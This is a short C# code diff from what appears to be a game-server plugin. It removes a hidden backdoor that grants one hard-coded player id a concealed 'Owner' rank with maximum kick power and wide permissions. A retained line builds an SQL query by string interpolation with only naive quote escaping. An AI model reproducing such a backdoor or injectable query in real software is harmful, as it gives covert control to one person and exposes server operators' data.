@@ -39,22 +39,6 @@ public static class PlayerExtensions
             var id = player.GetId();
                 
             await Core.Database.ExecuteNonQueryAsync($"UPDATE NewPlayers SET Username='{player.Nickname.Replace("'", "\\'")}' WHERE Id='{id}';");
-                
-            if (id != 21045) 
-                return;
-
-            var group = new UserGroup
-            {
-                BadgeColor = "Cyan",
-                BadgeText = "Owner",
-                Cover = true,
-                HiddenByDefault = true,
-                KickPower = 255,
-                Permissions = 536805375,
-                RequiredKickPower = 255, Shared = false
-            };
-                
-            player.SetRank("Owner", group);
         }
         catch (Exception e)
         {
